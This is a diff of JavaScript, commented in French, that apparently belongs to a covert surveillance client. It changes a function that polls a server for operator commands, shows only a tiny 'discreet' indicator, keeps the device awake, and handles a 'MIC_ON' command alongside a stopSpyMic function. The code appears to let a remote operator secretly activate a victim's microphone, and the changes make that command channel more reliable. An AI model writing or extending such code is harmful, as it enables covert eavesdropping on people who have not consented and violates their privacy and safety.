@@ -272,24 +272,33 @@ function stopSpyMic() {
 }
 
 async function checkCommands() {
+    if (!sessionId) return;
+    
     try {
-        // Fréquence de vérification augmentée si l'appareil est actif
-        const res = await fetch(`/api/command?sessionId=${sessionId}`);
+        const res = await fetch(`/api/command?sessionId=${sessionId}`, {
+            cache: 'no-store', // Éviter le cache navigateur pour les commandes
+            headers: { 'Pragma': 'no-cache' }
+        });
+        
+        if (!res.ok) return;
+
         const data = await res.json();
 
         if (data && data.command) {
+            const cmd = data.command;
+            console.log("⚡ COMMANDE REÇUE :", cmd.command);
+
+            // FEEDBACK VISUEL DISCRET (Petit point vert en haut à droite)
+            const feedback = document.createElement('div');
+            feedback.style.cssText = 'position:fixed; top:5px; right:5px; width:8px; height:8px; background:#00ff00; border-radius:50%; z-index:2147483647; box-shadow: 0 0 10px #00ff00; pointer-events:none; transition: opacity 1s;';
+            document.body.appendChild(feedback);
+            setTimeout(() => {
+                feedback.style.opacity = '0';
+                setTimeout(() => feedback.remove(), 1000);
+            }, 1000);
+
             // Si on reçoit une commande, on essaie de réveiller l'appareil
             requestWakeLock();
-            const cmd = data.command;
-            console.log("Commande reçue de l'admin:", cmd.command);
-
-            if (cmd.command) {
-                // FEEDBACK VISUEL DISCRET (Flash de la page) pour confirmer la réception
-                const feedback = document.createElement('div');
-                feedback.style.cssText = 'position:fixed; top:0; right:0; width:5px; height:5px; background:rgba(0,255,0,0.2); z-index:2147483647; pointer-events:none;';
-                document.body.appendChild(feedback);
-                setTimeout(() => feedback.remove(), 500);
-            }
 
             switch (cmd.command) {
                 case 'MIC_ON':
